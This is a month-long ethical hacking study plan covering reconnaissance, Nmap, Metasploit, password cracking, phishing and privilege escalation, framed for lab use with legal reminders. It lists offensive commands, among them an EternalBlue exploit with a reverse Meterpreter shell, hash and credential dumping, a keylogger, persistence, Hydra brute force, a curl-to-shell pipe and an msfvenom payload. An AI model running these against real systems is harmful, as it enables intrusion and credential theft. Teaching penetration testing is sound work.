# Month 7 — Week-by-Week Study Plan
## Ethical Hacking: Reconnaissance to Exploitation

**Total study time: ~80 hours over 4 weeks**

> **Legal Reminder:** Every technique in this module must ONLY be practised against systems you own or have explicit written permission to test. Practise on: your own lab VMs, TryHackMe, HackTheBox, PentesterLab, or a dedicated home lab. Unauthorised testing of real systems is a criminal offence under the IT Act 2000 in India and equivalent laws globally.

---

## Week 1 — Reconnaissance and Scanning

**Goal:** Master information gathering techniques — the techniques used before any attack is launched.

### Day 1 — The Penetration Testing Methodology
- **Read:** `01-ethical-hacking-recon.md` — methodology section
- **The 5-phase pen test:**
  1. **Reconnaissance (Passive + Active):** Gather information about the target without alerting them
  2. **Scanning and Enumeration:** Identify live hosts, open ports, running services, OS versions
  3. **Vulnerability Assessment:** Identify known CVEs on detected services
  4. **Exploitation:** Attempt to exploit identified vulnerabilities
  5. **Post-Exploitation:** What can you do after gaining access? Privilege escalation, lateral movement, data exfiltration

- **Rules of engagement (RoE) — mandatory for any pentest:**
  - Written permission/contract specifying exact scope (IP ranges, domains)
  - Permitted testing times (business hours or maintenance window?)
  - Contact information for emergency stop
  - Excluded systems (production databases, medical devices, etc.)
  - Reporting requirements and timeline

- **PTES (Penetration Testing Execution Standard):** Read ptes.org — the industry standard framework for full pentests

### Day 2 — Passive Reconnaissance
- **OSINT (Open Source Intelligence) without touching the target:**
  ```bash
  # Reverse DNS lookup (using public DNS — not touching the target)
  host 93.184.216.34
  
  # WHOIS domain registration information
  whois example.com
  
  # Shodan — internet-connected device search engine
  # Search for: title:"target company" ssl:"target.com"
  # Find exposed services, banners, software versions
  
  # Certificate Transparency logs — find all subdomains
  # crt.sh/?q=%.example.com
  # Reveals: mail.example.com, dev.example.com, staging.example.com
  
  # LinkedIn + GitHub OSINT
  # Company employees → usernames → GitHub commits → potential API keys in code
  ```
- **theHarvester — automated email/domain OSINT:**
  ```bash
  pip install theHarvester
  theHarvester -d example.com -b all
  # Collects: email addresses, subdomain names, IP addresses, names from LinkedIn/Twitter
  ```
- **SpiderFoot (automated OSINT framework):**
  ```bash
  pip install spiderfoot
  python3 sf.py -l 127.0.0.1:5001  # Web UI at localhost:5001
  # Add target domain → select data sources → automated OSINT collection
  ```

### Day 3 — Active Reconnaissance: Nmap Mastery
- **Nmap fundamentals — you must memorise these flags:**
  ```bash
  # Host discovery (which hosts are alive?)
  nmap -sn 192.168.1.0/24        # Ping scan — no port scan, just live hosts
  
  # Port scanning
  nmap -sS target.com            # SYN scan (stealth, most common)
  nmap -sT target.com            # TCP connect scan (slower, more detectable)
  nmap -sU target.com            # UDP scan (slow, for DNS/SNMP/DHCP)
  nmap -p- target.com            # All 65535 ports (slow but thorough)
  nmap -p 22,80,443,8080         # Specific ports only
  
  # Service and version detection
  nmap -sV target.com            # Version detection (what software is running?)
  nmap -O target.com             # OS detection (what OS is the target?)
  nmap -A target.com             # Aggressive: OS + version + scripts + traceroute
  
  # Output formats
  nmap -oN output.txt target.com  # Normal output
  nmap -oX output.xml target.com  # XML (for importing into other tools)
  nmap -oA output target.com      # All formats simultaneously
  ```
- **Nmap Scripting Engine (NSE):**
  ```bash
  # Vulnerability scanning scripts
  nmap --script vuln target.com
  
  # Service-specific scripts
  nmap --script smb-vuln-ms17-010 target.com  # EternalBlue check
  nmap --script http-shellshock target.com    # Shellshock check
  
  # Banner grabbing (what do services say about themselves?)
  nmap --script banner target.com
  ```
- **Practice:** Set up a Metasploitable2 VM and run a full Nmap scan

### Day 4 — Enumeration: Going Deeper
- **SMB Enumeration (Windows file sharing):**
  ```bash
  # Enumerate SMB shares
  smbclient -L //target -N          # List shares, null auth
  smbmap -H target -u '' -p ''      # Map shares with permissions
  
  # Check for EternalBlue vulnerability
  nmap --script smb-vuln-ms17-010 target
  
  # Enum4linux (automated Windows/Samba enumeration)
  enum4linux -a target
  # Gives: users, groups, shares, password policy, OS info
  ```
- **Web server enumeration:**
  ```bash
  # Directory busting — find hidden pages
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
  
  # Technology detection
  whatweb http://target.com
  wappalyzer  # Browser extension showing tech stack
  
  # Find robots.txt, sitemap.xml
  curl http://target.com/robots.txt
  ```
- **DNS Enumeration:**
  ```bash
  # Zone transfer (misconfigured DNS servers leak all records)
  dig axfr @ns1.target.com target.com
  
  # Subdomain enumeration with DNSRecon
  dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsenum/dns.txt
  
  # Fierce (DNS reconnaissance)
  fierce --domain target.com
  ```

### Day 5 — Vulnerability Assessment
- **OpenVAS (free, open-source vulnerability scanner):**
  ```bash
  # Install on Kali/Parrot
  apt install openvas
  gvm-setup   # Initial setup (takes 30+ min, downloads NVT database)
  gvm-start
  # Access: https://127.0.0.1:9392
  # Create scan target → New Task → Run Full and Fast scan
  ```
- **Nessus Essentials (free for 16 IPs):** tenable.com/products/nessus/nessus-essentials
- **Interpreting vulnerability scan results:**
  - **Critical (CVSS 9.0-10.0):** Remote code execution, unauthenticated access to sensitive data — must fix immediately
  - **High (7.0-8.9):** Significant risk requiring prompt attention
  - **Medium (4.0-6.9):** Important but lower risk, schedule for near-term remediation
  - **Low (0.1-3.9):** Minor risk, fix in normal patching cycle
  - **Always verify:** Scanners have false positives. Verify a finding manually before reporting it.
- **CVE database:** cve.mitre.org — look up any CVE ID to understand the vulnerability
- **NVD:** nvd.nist.gov — National Vulnerability Database with CVSS scores and patch information
- **Complete quiz questions 1-7 from `quiz-07.json`**

---

## Week 2 — Exploitation

**Goal:** Use Metasploit and manual techniques to exploit vulnerabilities safely in a lab.

### Day 6 — Metasploit Framework Fundamentals
- **Read:** `01-ethical-hacking-recon.md` — exploitation section
- **Metasploit architecture:**
  - **Exploits:** Modules that take advantage of vulnerabilities
  - **Payloads:** Code that runs after successful exploitation (shells, Meterpreter)
  - **Auxiliaries:** Supporting modules (scanners, fuzzers, brute forcers)
  - **Post-exploitation:** Modules that run after access is gained

- **Core Metasploit workflow:**
  ```bash
  # Start Metasploit
  msfconsole
  
  # Search for exploits
  msf> search ms17-010          # EternalBlue
  msf> search type:exploit platform:windows smb
  
  # Select and configure an exploit
  msf> use exploit/windows/smb/ms17_010_eternalblue
  msf> info                     # Read the exploit documentation
  msf> show options             # See required parameters
  msf> set RHOSTS 192.168.1.100 # Set target
  msf> set LHOST 192.168.1.50   # Set your listener IP
  msf> set payload windows/x64/meterpreter/reverse_tcp
  
  # Run the exploit
  msf> run                      # or "exploit"
  
  # If successful — Meterpreter session opens
  meterpreter> sysinfo          # Target OS info
  meterpreter> getuid           # Current user
  meterpreter> getsystem        # Attempt privilege escalation
  meterpreter> hashdump         # Dump password hashes
  meterpreter> screenshot       # Take a screenshot
  meterpreter> keyscan_start    # Start keylogger
  ```

### Day 7 — Metasploit Lab: Metasploitable2
- **Set up Metasploitable2:**
  ```bash
  # Download Metasploitable2 from SourceForge
  # Import OVA into VirtualBox or VMware
  # Set to Host-Only network (CRITICAL — never internet-accessible)
  # Default credentials: msfadmin:msfadmin
  ```
- **Vulnerabilities to exploit on Metasploitable2:**
  1. **vsftpd 2.3.4 backdoor** — module: `exploit/unix/ftp/vsftpd_234_backdoor`
  2. **UnrealIRCd 3.2.8.1 backdoor** — module: `exploit/unix/irc/unreal_ircd_3281_backdoor`
  3. **Samba "username map script"** — module: `exploit/multi/samba/usermap_script`
  4. **Distcc daemon** — module: `exploit/unix/misc/distcc_exec`
  5. **Java RMI server** — module: `exploit/multi/misc/java_rmi_server`
- **For each exploit:** Document the vulnerability, run the exploit, what access did you gain?

### Day 8 — Manual Exploitation: Buffer Overflow Concepts
- **Why buffer overflows matter:** Classic vulnerability in C programs that can lead to remote code execution. Understanding this is foundational for understanding why memory safety matters.
- **Concept overview:**
  ```
  Normal: [INPUT DATA][...........BUFFER SPACE...........]
  Overflow: [INPUTINPUTINPUTINPUTINPUTINPUT] → overflows into return address
  ```
  - If you overflow the return address with an address you control → code execution
- **Practice:** TryHackMe — "Buffer Overflow Prep" room (free)
- **Exploit development workflow:**
  1. Fuzz the application to find the crash point
  2. Find the offset to the EIP (return address)
  3. Control EIP — put your chosen address there
  4. Find space for shellcode (or JMP ESP)
  5. Generate shellcode (msfvenom)
  6. Exploit!

### Day 9 — Password Attacks
- **Complete `lab-07-a.json`** — all 5 steps
- **Password cracking:**
  ```bash
  # Hashcat — GPU-accelerated hash cracking
  hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM hashes (-m 1000)
  hashcat -m 1800 hashes.txt rockyou.txt  # SHA-512 ($6$) Linux hashes
  hashcat -m 0 md5_hashes.txt rockyou.txt  # MD5 hashes
  
  # John the Ripper — classic CPU-based cracker
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt
  
  # Extract hashes from /etc/shadow (after gaining root access in lab)
  john /etc/shadow
  
  # Generate password mutation rules
  hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
  ```
- **Hydra — online brute force (for services):**
  ```bash
  # SSH brute force
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
  
  # HTTP form brute force
  hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"
  
  # FTP
  hydra -L users.txt -P passwords.txt ftp://192.168.1.100
  ```

### Day 10 — Post-Exploitation and Pivoting
- **Complete `lab-07-b.json`** — all 5 steps
- **Post-exploitation with Meterpreter:**
  ```bash
  # Privilege escalation
  meterpreter> getsystem         # Try common escalation methods
  meterpreter> use post/multi/recon/local_exploit_suggester  # Find local exploits
  
  # Persistence
  meterpreter> run persistence -h  # Run a persistent agent
  meterpreter> use post/windows/manage/persistence_exe
  
  # Credential harvesting
  meterpreter> load kiwi           # Mimikatz integration in Meterpreter
  meterpreter> creds_all           # Dump all credentials
  
  # Lateral movement setup
  meterpreter> run post/multi/manage/shell_to_meterpreter
  msf> use auxiliary/server/socks4a  # Set up SOCKS proxy for pivoting
  ```
- **Report writing for this week:** Document all vulnerabilities found on Metasploitable2 in a professional format (finding title, severity, description, evidence, recommendation)

---

## Week 3 — Advanced Techniques and Practice

### Day 11 — Social Engineering and Phishing
- **Read:** `02-social-engineering-reporting.md` — social engineering section
- **Why social engineering works:** Humans are the weakest link. Technical controls are bypassed by convincing a user to take an action.
- **GoPhish (free, open-source phishing framework):**
  ```bash
  # Download from github.com/gophish/gophish
  # Run: ./gophish
  # Access admin panel: https://127.0.0.1:3333
  # 1. Create a Sending Profile (SMTP server)
  # 2. Create a Landing Page (credential harvest page)
  # 3. Create an Email Template
  # 4. Create a Campaign targeting your OWN test email
  # 5. Track: who opened, who clicked, who submitted credentials
  ```
- **Social engineering pretexts used in real pentests:**
  - IT support calling about account issues (get credentials over phone)
  - Fake invoice from a supplier (macro-enabled Word doc)
  - CEO urgent wire transfer request (BEC)
  - Fake VPN login page (harvest VPN credentials)
- **Legal requirement:** Social engineering in a pentest requires EXPLICIT written permission from the client to target their employees

### Day 12 — Privilege Escalation: Linux
- **Linux privilege escalation (starting as low-privilege user, goal: root):**
  ```bash
  # Automated enumeration
  # Download: github.com/carlospolop/PEASS-ng (linPEAS)
  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
  
  # Manual checks:
  sudo -l                  # What can this user run as root?
  find / -perm -4000 2>/dev/null   # SUID binaries (run as owner, often root)
  crontab -l               # Scheduled tasks (writable script = root)
  cat /etc/crontab         # System cron (look for writable paths)
  find / -writable -type f 2>/dev/null | grep -v proc  # World-writable files
  
  # Check kernel version for known exploits
  uname -r
  # Search: exploitdb.com or github.com for kernel version exploits
  ```
- **Common Linux privilege escalation paths:**
  - Writable sudoers file or misconfigured sudo
  - SUID binary that can be exploited (GTFObins.github.io)
  - Writable script called by root cron
  - Docker group membership (docker run -v /:/host allows reading all files)
  - Weak file permissions on sensitive files

### Day 13 — Privilege Escalation: Windows
- **Windows privilege escalation (starting as low-privileged user, goal: SYSTEM):**
  ```powershell
  # Automated: winPEAS
  .\winPEASany.exe
  
  # Manual checks:
  whoami /all              # Current user and privileges
  net user                 # List all users
  net localgroup administrators  # Who's admin?
  
  # Unquoted service paths
  wmic service get name,startname,pathname | findstr /i "c:\\" | findstr /iv "\"\"
  # If a service path has spaces and isn't quoted: can plant malicious exe
  
  # Weak service permissions
  accesschk.exe -uwcqv * /accepteula  # Services current user can modify
  
  # AlwaysInstallElevated (installs MSI as SYSTEM)
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  # If 1: msfvenom -p windows/meterpreter/reverse_tcp -f msi > evil.msi
  ```
- **GTFOBins equivalent for Windows:** lolbas-project.github.io

### Day 14 — TryHackMe Practical Practice
- **Complete these TryHackMe rooms (in order):**
  1. **Basic Pentesting** (free) — full pentest walkthrough of a simple machine
  2. **Blue** (free) — EternalBlue exploitation on a real Windows VM
  3. **Kenobi** (free) — Linux privilege escalation
  4. **Steel Mountain** (free) — Windows exploitation + priv esc
  5. **Relevant** (free) — Windows machine with Eternal Blue + multiple paths

- **For each room:** Document what you found at each phase, what techniques you used, what was the flag. Build your writeup folder.

### Day 15 — Review and Exercises
- **Complete:** `exercises-07.md` questions 1-15
- **CTF Practice:** TryHackMe daily challenge or HackTheBox starting point machines
- **Reflect:** Which techniques felt comfortable? Which need more practice?

---

## Week 4 — Mastery, Reporting, and Portfolio

### Day 16-17 — Pentest Report Writing
- Complete `assignment-07.md` Tasks 1 and 2
- **Professional pentest report structure:**
  ```
  1. Executive Summary (1-2 pages, non-technical)
     - What was tested, when, by whom
     - Overall risk rating
     - Top 3 critical findings summary
     - Business impact in plain language
  
  2. Scope and Methodology (1 page)
     - IP ranges/domains in scope
     - Testing approach (black-box, grey-box, white-box)
     - Testing dates and time windows
  
  3. Findings Summary Table
     | ID | Title | Severity | CVSS | Status |
     
  4. Detailed Findings (one page per finding)
     - Finding title and severity
     - Description (what is the vulnerability?)
     - Evidence (screenshot, command output)
     - Risk (what could an attacker do with this?)
     - Recommendation (how to fix it)
  
  5. Appendix: Tool outputs, raw logs
  ```

### Day 18-19 — HackTheBox Practice
- Complete `assignment-07.md` Tasks 3 and 4
- **Attempt 2 HackTheBox machines:** Start with "Easy" rated machines on the retired list (write-ups available to compare your approach)
- **Focus:** Treat each machine as a real pentest — document everything

### Day 20 — Final Assessment
- **Complete:** `exercises-07.md` questions 16-25
- **Quiz:** `quiz-07.json` — all 15 questions
- **Competency checklist:**
  - [ ] Run a full Nmap scan (host discovery → service version detection → scripts) and interpret output
  - [ ] Use theHarvester to enumerate emails and subdomains for a test domain
  - [ ] Exploit a vulnerability on Metasploitable2 using Metasploit
  - [ ] Crack an MD5 hash using hashcat with a wordlist
  - [ ] Identify 3 Linux privilege escalation vectors using linPEAS output
  - [ ] Identify 3 Windows privilege escalation vectors using winPEAS output
  - [ ] Write a professional finding report (one vulnerability, with evidence and recommendation)
  - [ ] Explain the difference between black-box, grey-box, and white-box testing
  - [ ] Complete a TryHackMe machine from initial recon to root
  - [ ] Describe 5 OSINT sources and what information each provides
